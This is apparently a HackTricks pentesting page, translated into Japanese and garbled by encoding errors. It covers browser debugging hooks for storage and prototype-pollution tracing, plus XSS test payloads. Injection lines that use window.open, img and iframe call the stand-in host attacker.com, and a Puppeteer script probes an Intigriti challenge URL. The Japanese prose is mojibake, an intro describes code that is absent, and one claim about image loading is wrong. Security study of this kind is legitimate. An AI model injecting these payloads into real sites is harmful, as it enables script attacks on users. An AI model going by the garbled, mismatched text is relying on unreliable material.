ã“ã®JavaScriptã‚³ãƒ¼ãƒ‰ã¯ã€`value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã‚‹ãŸã³ã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®šã—ã¾ã™ã€‚`Object.defineProperty()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€`value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã®ã‚²ãƒƒã‚¿ãƒ¼ã¨ã‚»ãƒƒã‚¿ãƒ¼ã‚’å®šç¾©ã—ã¾ã™ã€‚ã‚²ãƒƒã‚¿ãƒ¼é–¢æ•°ã«ã¯`debugger`ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆãŒå«ã¾ã‚Œã¦ãŠã‚Šã€`value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã‚‹ãŸã³ã«ãƒ–ãƒ©ã‚¦ã‚¶ã®é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆãŒãƒˆãƒªã‚¬ã•ã‚Œã¾ã™ã€‚ã‚»ãƒƒã‚¿ãƒ¼é–¢æ•°ã¯å˜ã«å€¤ã‚’`_value`ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ä»£å…¥ã—ã¾ã™ã€‚
```javascript
// Stop when a property in sessionStorage or localStorage is set/get
// via getItem or setItem functions
sessionStorage.getItem = localStorage.getItem  = function(prop) {
debugger;
return sessionStorage[prop];
}

localStorage.setItem = function(prop, val) {
debugger;
localStorage[prop] = val;
}
```

```javascript
// Stop when anyone sets or gets the property "ppmap" in any object
// For example sessionStorage.ppmap
// "123".ppmap
// Useful to find where weird properties are being set or accessed
// or to find where prototype pollutions are occurring

function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});
};

debugAccess(Object.prototype, 'ppmap')
```
## ãƒ†ã‚¹ãƒˆãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è‡ªå‹•çš„ã«ãƒ–ãƒ©ã‚¦ã‚¶ã§ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹

Sometimes, when testing for Cross-Site Scripting (XSS) vulnerabilities, it can be useful to automate the process of accessing test payloads in a browser. This can help in quickly identifying if the payload triggers any XSS vulnerabilities.

XSS vulnerabilities occur when an application fails to properly sanitize user input and allows malicious scripts to be executed in a victim's browser. By automating the process of accessing test payloads, we can efficiently test for these vulnerabilities.

To automate browser access to test payloads, we can use various techniques:

### 1. JavaScript `window.open()`

We can use the JavaScript `window.open()` function to automatically open a new browser window or tab and load the test payload. This can be done by injecting the following code into the vulnerable input field:

```javascript
javascript:window.open('http://attacker.com/payload');
```

Replace `http://attacker.com/payload` with the URL of your test payload.

### 2. Image Source (`<img src="">`)

Another technique is to use the `<img>` tag with the `src` attribute set to the test payload URL. This will cause the browser to automatically load the image, triggering the execution of the payload. Inject the following code into the vulnerable input field:

```html
<img src="http://attacker.com/payload">
```

Replace `http://attacker.com/payload` with the URL of your test payload.

### 3. Iframe (`<iframe src="">`)

Similarly, we can use the `<iframe>` tag with the `src` attribute set to the test payload URL. This will load the payload in an embedded frame within the page. Inject the following code into the vulnerable input field:

```html
<iframe src="http://attacker.com/payload"></iframe>
```

Replace `http://attacker.com/payload` with the URL of your test payload.

By automating browser access to test payloads, we can quickly identify if the application is vulnerable to XSS attacks. Remember to always perform these tests responsibly and with proper authorization.
```javascript
//Taken from https://github.com/svennergr/writeups/blob/master/inti/0621/README.md
const puppeteer = require("puppeteer");

const realPasswordLength = 3000;
async function sleep(ms) {
return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
const browser = await puppeteer.launch();
const page = await browser.newPage();
//Loop to iterate through different values
for (let i = 0; i < 10000; i += 100) {
console.log(`Run number ${i}`);
const input = `${"0".repeat(i)}${realPasswordLength}`;
console.log(`  https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`);
//Go to the page
await page.goto(
`https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`
);
//Call function "generate()" inside the page
await page.evaluate("generate()");
//Get node inner text from an HTML element
const passwordContent = await page.$$eval(
".alert .page-content",
(node) => node[0].innerText
);
//Transform the content and print it in console
const plainPassword = passwordContent.replace("Your password is: ", "");
if (plainPassword.length != realPasswordLength) {
console.log(i, plainPassword.length, plainPassword);
}

await sleep(1000);
}
await browser.close();
})();
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿ** ã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„ã§ã™ã‹ï¼Ÿ** ã¾ãŸã¯ã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ã§ã™ã‹ï¼Ÿ** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
